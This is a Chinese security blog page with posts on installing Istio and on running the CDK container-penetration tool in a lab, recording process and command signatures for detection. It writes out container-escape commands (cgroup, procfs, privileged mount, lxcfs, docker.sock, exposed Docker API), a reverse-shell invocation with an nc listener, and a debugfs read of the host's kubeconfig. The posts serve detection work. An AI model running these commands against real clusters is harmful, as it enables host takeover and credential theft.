<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="Sally"><title>Sally's Blog</title><meta name="description" content="A simple and beautiful blog"><meta name="keywords" content="Blog,博客,Hexo"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="shortcut icon" type="image/x-icon" href="/images/favicon.webp"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="stylesheet" href="/css/insight.css"><link rel="stylesheet" href="/css/search.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><script src="/js/jquery.js"></script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="page-top animated fadeInDown"><div class="nav"><li> <a class="current" href="/">主页</a></li><li> <a href="/archives">归档</a></li><li> <a href="/tags">标签</a></li><li> <a href="/about">关于</a></li><li> <a href="/links">友链</a></li></div><div class="information"><div class="nav_right_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)" style="display:none;"> </a></li><li><a class="fa fa-search" onclick="openWindow();"></a></li></div><div class="avatar"><img src="/images/kabi.jpg"></div></div></div><div class="sidebar animated fadeInDown"><div class="sidebar-top"><div class="logo-title"><div class="title"><img src="/images/kabi.jpg" style="width:220px;" alt="favicon"><h3 title=""><a href="/">Sally's Blog</a></h3><div class="description"><p>A simple and beautiful blog</p></div></div><ul class="social-links"><li><a target="_blank" rel="noopener" href="https://github.com/phoenixmerk"><i class="fa fa-github"></i></a></li><li><a href="mailto:yourname@example.com"><i class="fa fa-envelope"></i></a></li><li><a target="_blank" rel="noopener" href="https://zhihu.com/people/jin-xin-4-68"><i class="fa fa-mortar-board"></i></a></li></ul><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="220" height="86" src="//music.163.com/outchain/player?type=2&amp;id=1293913379&amp;auto=1&amp;height=66&amp;&amp;loop=1"></iframe></div></div><div class="footer"><div class="p"> <span> 全站CC-BY-SA-3.0 </span><i class="fa fa-star"></i><span> Sally</span></div><div class="by_farbox"><span>Powered by </span><a href="https://hexo.io/zh-cn/" target="_blank">Hexo </a><span> & </span><span>Anatolo </span></div><div class="beian"></div></div></div><div class="main"><div class="autopagerize_page_element"><div class="content"><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2024/01/26/%E8%99%9A%E6%8B%9F%E6%9C%BAk8s%E9%9B%86%E7%BE%A4%E5%AE%89%E8%A3%85istio/">虚拟机k8s集群安装istio</a></h3></div><div class="post-content"><div class="card"><p><p><a href="https://phoenixmerk.github.io/"><img src="https://img.shields.io/badge/%E4%BD%9C%E8%80%85-phoenixmerk-blue.svg" alt="img"></a></p>
<h2 id="下载istio"><a href="#下载istio" class="headerlink" title="下载istio"></a>下载istio</h2><p>在release页面下载合适的版本压缩包，放到你的安装目录</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/istio/istio/releases</span><br></pre></td></tr></table></figure>

<p>（如果网络允许可以使用wget下载release包）</p>
<p>解压istio安装包</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf istio-1.18.1-linux-amd64.tar.gz</span><br></pre></td></tr></table></figure>

<p>各个目录的作用：</p>
<ul>
<li>bin：存放的是 istioctl 工具</li>
<li>manifests：相关 yaml 用于部署 Istio的</li>
<li>samples：一些 Demo 用的 yaml</li>
<li>tools：一些工具</li>
</ul>
<p>进入解压后的目录将istioctl工具放置在bin目录方便执行命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> istio-1.18.1</span><br><span class="line"><span class="built_in">cp</span> bin/istioctl /usr/local/bin/</span><br></pre></td></tr></table></figure>

<h2 id="安装istio"><a href="#安装istio" class="headerlink" title="安装istio"></a>安装istio</h2><p>安装演示istio环境</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">istioctl install --<span class="built_in">set</span> profile=demo -y</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240126212832655.png" alt="image-20240126212832655"></p>
<p>给你想要命名空间，例如：default，打上 label，告诉 Istio 在部署应用的时候，自动注入 Envoy 边车代理</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl label namespace default istio-injection=enabled</span><br></pre></td></tr></table></figure>

<p>验证安装成功</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先根据安装的profile导出manifest</span></span><br><span class="line">istioctl manifest generate --<span class="built_in">set</span> profile=demo &gt; <span class="variable">$HOME</span>/generated-manifest.yaml</span><br><span class="line"><span class="comment"># 然后根据验证实际环境和manifest文件是否一致</span></span><br><span class="line">istioctl verify-install -f <span class="variable">$HOME</span>/generated-manifest.yaml</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240126220607815.png" alt="image-20240126220607815"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看istio部署的pod</span></span><br><span class="line">kubectl get pods -n istio-system</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240126220811008.png" alt="image-20240126220811008"></p>
<p>参考链接：<a target="_blank" rel="noopener" href="https://www.lixueduan.com/posts/istio/01-install/">https://www.lixueduan.com/posts/istio/01-install/</a></p>
</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2024-01-26</span><i class="fa fa-tag"></i><a class="tag" href="/tags/容器安全/" title="容器安全">容器安全 </a><span class="leancloud_visitors"></span><span>大约274个字, 54秒读完</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2024/01/17/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7CDK%E7%89%B9%E5%BE%81%E6%A3%80%E6%B5%8B/">自动化渗透工具CDK特征检测</a></h3></div><div class="post-content"><div class="card"><p><p><a href="https://phoenixmerk.github.io/"><img src="https://img.shields.io/badge/%E4%BD%9C%E8%80%85-phoenixmerk-blue.svg" alt="img"></a></p>
<ul>
<li><input disabled="" type="checkbox"> 容器逃逸-docker-runc CVE-2019-5736 </li>
<li><input disabled="" type="checkbox"> 容器逃逸-containerd-shim CVE-2020-15257       </li>
<li><input checked="" disabled="" type="checkbox"> 容器逃逸-docker.sock逃逸PoC(docker-in-docker) </li>
<li><input checked="" disabled="" type="checkbox"> 容器逃逸-docker.sock命令执行                  </li>
<li><input checked="" disabled="" type="checkbox"> 容器逃逸-Docker API(2375)命令执行             </li>
<li><input checked="" disabled="" type="checkbox"> 容器逃逸-挂载逃逸(特权容器)                   </li>
<li><input checked="" disabled="" type="checkbox"> 容器逃逸-Cgroup逃逸(特权容器)                 </li>
<li><input checked="" disabled="" type="checkbox"> 容器逃逸-Procfs目录挂载逃逸                   </li>
<li><input disabled="" type="checkbox"> 容器逃逸-Ptrace逃逸PoC                        </li>
<li><input checked="" disabled="" type="checkbox"> 容器逃逸-lxcfs cgroup错误配置逃逸            </li>
<li><input checked="" disabled="" type="checkbox"> 容器逃逸-重写Cgroup以访问设备                 </li>
<li><input checked="" disabled="" type="checkbox"> 网络探测-K8s组件探测                          </li>
<li><input checked="" disabled="" type="checkbox"> 信息收集-检查和获取Istio元信息                </li>
<li><input checked="" disabled="" type="checkbox"> 远程控制-反弹shell                            </li>
<li><input disabled="" type="checkbox"> 信息窃取-暴力破解镜像源账号                   </li>
<li><input disabled="" type="checkbox"> 信息窃取-扫描AK及API认证凭据                  </li>
<li><input disabled="" type="checkbox"> 信息窃取-窃取K8s Secrets                      </li>
<li><input disabled="" type="checkbox"> 信息窃取-窃取K8s Config                       </li>
<li><input disabled="" type="checkbox"> 信息窃取-获取K8s Pod Security Policies        </li>
<li><input disabled="" type="checkbox"> 权限提升-K8s RBAC绕过                         </li>
<li><input disabled="" type="checkbox"> 持久化-部署WebShell                         </li>
<li><input disabled="" type="checkbox"> 持久化-部署后门Pod                          </li>
<li><input disabled="" type="checkbox"> 持久化-部署影子K8s api-server              </li>
<li><input disabled="" type="checkbox"> 持久化-K8s MITM攻击(CVE-2020-8554)      </li>
<li><input disabled="" type="checkbox"> 持久化-部署K8s CronJob</li>
</ul>
<h2 id="CDK网络探测-k8s组件探测"><a href="#CDK网络探测-k8s组件探测" class="headerlink" title="CDK网络探测-k8s组件探测"></a>CDK网络探测-k8s组件探测</h2><p>进入测试容器中查看k8s环境变量</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">env</span> |grep KUBE</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240117102257655.png" alt="image-20240117102257655"></p>
<p>网络探测扫描整个C段中开放的k8s api端点</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cdk run service-probe 10.96.0.1-255</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240117102547217.png" alt="image-20240117102547217"></p>
<h3 id="特征提取"><a href="#特征提取" class="headerlink" title="特征提取"></a>特征提取</h3><h4 id="进程特征"><a href="#进程特征" class="headerlink" title="进程特征"></a>进程特征</h4><p>由于扫描的时间长，该进程很容易被检测到，以bash为父进程，cdk为子进程；cdk的参数为run service-probe [IP范围]。</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240117102649759.png" alt="image-20240117102649759"></p>
<h4 id="命令特征"><a href="#命令特征" class="headerlink" title="命令特征"></a>命令特征</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cdk run service-probe [IP范围]</span><br></pre></td></tr></table></figure>

<h2 id="CDK容器逃逸-lxcfs-cgroup错误配置逃逸"><a href="#CDK容器逃逸-lxcfs-cgroup错误配置逃逸" class="headerlink" title="CDK容器逃逸-lxcfs cgroup错误配置逃逸"></a>CDK容器逃逸-lxcfs cgroup错误配置逃逸</h2><p>运行cdk逃逸脚本</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cdk run lxcfs-rw</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240116183339381.png" alt="image-20240116183339381"></p>
<p>运行debugfs查看host_dev文件系统</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">debugfs -w host_dev</span><br><span class="line"><span class="built_in">cat</span> /root/.kube/config</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240116183421548.png" alt="image-20240116183421548"></p>
<h3 id="特征提取-1"><a href="#特征提取-1" class="headerlink" title="特征提取"></a>特征提取</h3><h4 id="进程特征-1"><a href="#进程特征-1" class="headerlink" title="进程特征"></a>进程特征</h4><p>（这里换成了ubuntu镜像好查看进程细节）</p>
<p>这个不是短进程，查看进程信息，bash为父进程，debugfs为子进程（参数为-w cdk-test，如果是使用cdk则参数固定为-w host_dev）</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240116175344403.png" alt="image-20240116175344403"></p>
<h4 id="命令特征-1"><a href="#命令特征-1" class="headerlink" title="命令特征"></a>命令特征</h4><p>以下的命令都是固定的，也是由于CDK内置的原因</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./cdk run lxcfs-rw</span><br><span class="line"> debugfs -w host_dev</span><br></pre></td></tr></table></figure>

<h2 id="CDK容器逃逸-重写cgroup以访问设备"><a href="#CDK容器逃逸-重写cgroup以访问设备" class="headerlink" title="CDK容器逃逸-重写cgroup以访问设备"></a>CDK容器逃逸-重写cgroup以访问设备</h2><p>由于这个和上面的lxcfs cgroup错误配置逃逸十分相似于是没有进行复现</p>
<h3 id="特征提取-2"><a href="#特征提取-2" class="headerlink" title="特征提取"></a>特征提取</h3><h4 id="进程特征-2"><a href="#进程特征-2" class="headerlink" title="进程特征"></a>进程特征</h4><p>父进程为bash，子进程为debugfs，参数为cdk_mknod_result</p>
<h4 id="命令特征-2"><a href="#命令特征-2" class="headerlink" title="命令特征"></a>命令特征</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./cdk run rewrite-cgroup-devices </span><br><span class="line">debugfs cdk_mknod_result</span><br></pre></td></tr></table></figure>

<h2 id="CDK远程控制-反弹shell"><a href="#CDK远程控制-反弹shell" class="headerlink" title="CDK远程控制-反弹shell"></a>CDK远程控制-反弹shell</h2><p>远程服务器监听端口</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 14444</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240117104622305.png" alt="image-20240117104622305"></p>
<p>进入测试容器执行命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cdk run reverse-shell IP:端口</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240117104557076.png" alt="image-20240117104557076"></p>
<h3 id="特征提取-3"><a href="#特征提取-3" class="headerlink" title="特征提取"></a>特征提取</h3><h4 id="进程特征-3"><a href="#进程特征-3" class="headerlink" title="进程特征"></a>进程特征</h4><p>这个不是短进程，以bash为父进程，cdk为子进程，参数为run reverse-shell IP:端口</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240117104712082.png" alt="image-20240117104712082"></p>
<h4 id="命令特征-3"><a href="#命令特征-3" class="headerlink" title="命令特征"></a>命令特征</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cdk run reverse-shell IP:端口</span><br></pre></td></tr></table></figure>

<h2 id="CDK容器逃逸-docker-sock逃逸PoC-docker-in-docker"><a href="#CDK容器逃逸-docker-sock逃逸PoC-docker-in-docker" class="headerlink" title="CDK容器逃逸-docker.sock逃逸PoC(docker-in-docker)"></a>CDK容器逃逸-docker.sock逃逸PoC(docker-in-docker)</h2><p>进入测试容器，写一个重复执行的脚本去执行CDK命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span></span><br><span class="line">    ./cdk run docker-sock-check /var/run/docker.sock</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<h3 id="特征提取-4"><a href="#特征提取-4" class="headerlink" title="特征提取"></a>特征提取</h3><h4 id="进程特征-4"><a href="#进程特征-4" class="headerlink" title="进程特征"></a>进程特征</h4><p>docker.sock的挂载位置可能改变。</p>
<p>父进程为bash，子进程为cdk，执行的命令参数为run docker-sock-check [docker.sock挂载位置]</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240118102141321.png" alt="image-20240118102141321"></p>
<h4 id="命令特征-4"><a href="#命令特征-4" class="headerlink" title="命令特征"></a>命令特征</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cdk run docker-sock-check  [docker.sock挂载位置]</span><br></pre></td></tr></table></figure>

<h2 id="CDK容器逃逸-docker-sock命令执行"><a href="#CDK容器逃逸-docker-sock命令执行" class="headerlink" title="CDK容器逃逸-docker.sock命令执行"></a>CDK容器逃逸-docker.sock命令执行</h2><p>进入测试容器执行CDK命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cdk run docker-sock-pwn /var/run/docker.sock <span class="built_in">touch</span> /host/tmp/pwn-success</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240118104324387.png" alt="image-20240118104324387"></p>
<h3 id="特征提取-5"><a href="#特征提取-5" class="headerlink" title="特征提取"></a>特征提取</h3><h4 id="进程特征-5"><a href="#进程特征-5" class="headerlink" title="进程特征"></a>进程特征</h4><p>父进程为bash，子进程为cdk，参数为run docker-sock-pwn [docker.sock位置] [CMD命令]</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240118104435091.png" alt="image-20240118104435091"></p>
<h4 id="命令特征-5"><a href="#命令特征-5" class="headerlink" title="命令特征"></a>命令特征</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cdk run docker-sock-pwn [docker.sock位置] [CMD命令]</span><br></pre></td></tr></table></figure>

<h2 id="CDK容器逃逸-挂载逃逸-特权容器"><a href="#CDK容器逃逸-挂载逃逸-特权容器" class="headerlink" title="CDK容器逃逸-挂载逃逸(特权容器)"></a>CDK容器逃逸-挂载逃逸(特权容器)</h2><p>进入测试容器，写一个重复执行的脚本执行命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span></span><br><span class="line">    ./cdk run mount-disk</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240118111207956.png" alt="image-20240118111207956"></p>
<h3 id="特征提取-6"><a href="#特征提取-6" class="headerlink" title="特征提取"></a>特征提取</h3><h4 id="进程特征-6"><a href="#进程特征-6" class="headerlink" title="进程特征"></a>进程特征</h4><p>父进程为bash，子进程为cdk，参数为run mount-disk</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240118111342522.png" alt="image-20240118111342522"></p>
<h4 id="命令特征-6"><a href="#命令特征-6" class="headerlink" title="命令特征"></a>命令特征</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cdk run mount-disk</span><br></pre></td></tr></table></figure>

<h2 id="CDK容器逃逸Cgroup逃逸（特权容器）"><a href="#CDK容器逃逸Cgroup逃逸（特权容器）" class="headerlink" title="CDK容器逃逸Cgroup逃逸（特权容器）"></a>CDK容器逃逸Cgroup逃逸（特权容器）</h2><p>进入测试容器执行命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cdk run mount-cgroup <span class="string">&quot;touch /tmp/exp-success&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240118141449945.png" alt="image-20240118141449945"></p>
<p>查看是否执行成功</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240118134635362.png" alt="image-20240118134635362"></p>
<h3 id="特征提取-7"><a href="#特征提取-7" class="headerlink" title="特征提取"></a>特征提取</h3><h4 id="进程特征-7"><a href="#进程特征-7" class="headerlink" title="进程特征"></a>进程特征</h4><p>父进程bash，子进程cdk，参数run mount-cgroup [CMD命令]</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240118141407989.png" alt="image-20240118141407989"></p>
<h4 id="命令特征-7"><a href="#命令特征-7" class="headerlink" title="命令特征"></a>命令特征</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cdk run mount-cgroup [CMD命令]</span><br></pre></td></tr></table></figure>

<h2 id="CDK容器逃逸-Procfs目录挂载逃逸"><a href="#CDK容器逃逸-Procfs目录挂载逃逸" class="headerlink" title="CDK容器逃逸-Procfs目录挂载逃逸"></a>CDK容器逃逸-Procfs目录挂载逃逸</h2><p>进入测试容器，写一个重复执行的脚本执行命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span></span><br><span class="line">    ./cdk run mount-procfs /tmp/proc <span class="string">&quot;touch /tmp/exp-success&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240118134531304.png" alt="image-20240118134531304"></p>
<p>发现宿主机被写入文件</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240118134635362.png" alt="image-20240118134635362"></p>
<h3 id="特征提取-8"><a href="#特征提取-8" class="headerlink" title="特征提取"></a>特征提取</h3><h4 id="进程特征-8"><a href="#进程特征-8" class="headerlink" title="进程特征"></a>进程特征</h4><p>父进程为bash，子进程为cdk，参数为run mount-procfs [挂载proc路径] [CMD命令]</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240118134937362.png" alt="image-20240118134937362"></p>
<h4 id="命令特征-8"><a href="#命令特征-8" class="headerlink" title="命令特征"></a>命令特征</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cdk run mount-procfs [挂载proc路径]  [CMD命令]</span><br></pre></td></tr></table></figure>

<h2 id="CDK容器逃逸-Docker-API-2375-命令执行"><a href="#CDK容器逃逸-Docker-API-2375-命令执行" class="headerlink" title="CDK容器逃逸-Docker API(2375)命令执行"></a>CDK容器逃逸-Docker API(2375)命令执行</h2><p>进入测试容器执行命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cdk run docker-api-pwn http://192.168.38.210:2375 <span class="string">&quot;touch /host/tmp/docker-api-pwn&quot;</span> </span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240124202432240.png"></p>
<p>查看到成功写入</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240124202544160.png"></p>
<h3 id="特征提取-9"><a href="#特征提取-9" class="headerlink" title="特征提取"></a>特征提取</h3><h4 id="进程特征-9"><a href="#进程特征-9" class="headerlink" title="进程特征"></a>进程特征</h4><p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240124202634915.png"></p>
<p>父进程为bash，子进程为cdk，参数为docker-api-pwn [docker api访问路径] [CMD命令]</p>
<h4 id="命令特征-9"><a href="#命令特征-9" class="headerlink" title="命令特征"></a>命令特征</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cdk run docker-api-pwn [docker api访问路径] [CMD命令]</span><br></pre></td></tr></table></figure>

<h2 id="CDK信息收集-检查和获取Istio元信息"><a href="#CDK信息收集-检查和获取Istio元信息" class="headerlink" title="CDK信息收集-检查和获取Istio元信息"></a>CDK信息收集-检查和获取Istio元信息</h2><p>执行命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cdk run istio-check</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240126231629668.png" alt="image-20240126231629668"></p>
<h3 id="特征提取-10"><a href="#特征提取-10" class="headerlink" title="特征提取"></a>特征提取</h3><h4 id="进程特征-10"><a href="#进程特征-10" class="headerlink" title="进程特征"></a>进程特征</h4><p>父进程为bash，子进程为cdk，参数为run istio-check</p>
<h4 id="命令特征-10"><a href="#命令特征-10" class="headerlink" title="命令特征"></a>命令特征</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cdk run istio-chek</span><br></pre></td></tr></table></figure>

<h4 id="网络特征"><a href="#网络特征" class="headerlink" title="网络特征"></a>网络特征</h4><p>需要向<a target="_blank" rel="noopener" href="http://httpbin.org/get%E5%8F%91%E9%80%81%E8%AF%B7%E6%B1%82">http://httpbin.org/get发送请求</a></p>
</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2024-01-17</span><i class="fa fa-tag"></i><a class="tag" href="/tags/容器安全/" title="容器安全">容器安全 </a><span class="leancloud_visitors"></span><span>大约1310个字, 4分钟22秒读完</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2024/01/16/lxcfs%20cgroup%E9%94%99%E8%AF%AF%E9%85%8D%E7%BD%AE%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/">lxcfs cgroup错误配置容器逃逸</a></h3></div><div class="post-content"><div class="card"><p><p><a href="https://phoenixmerk.github.io/"><img src="https://img.shields.io/badge/%E4%BD%9C%E8%80%85-phoenixmerk-blue.svg" alt="img"></a></p>
<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>Ubuntu 20.04</p>
<p>docker 20.10.21</p>
<p>kubernetes 1.22.7</p>
<h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><h3 id="安装lxcfs"><a href="#安装lxcfs" class="headerlink" title="安装lxcfs"></a>安装lxcfs</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install lxcfs</span><br></pre></td></tr></table></figure>

<p>验证安装</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240116151755434.png" alt="image-20240116151755434"></p>
<p>运行lxcfs</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systemctl deamon-reload</span><br><span class="line">systemctl start lxcfs</span><br><span class="line">systemctl status lxcfs</span><br></pre></td></tr></table></figure>

<p>或者手动运行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lxcfs /var/lib/lxcfs</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240116152153601.png" alt="image-20240116152153601"></p>
<h3 id="部署带有漏洞的pod"><a href="#部署带有漏洞的pod" class="headerlink" title="部署带有漏洞的pod"></a>部署带有漏洞的pod</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kubectl create ns cdk-test</span><br><span class="line">kubectl apply -f cdk-nginx.yaml</span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">cdk-nginx</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">cdk-test</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">nginx</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">1</span></span><br><span class="line">  <span 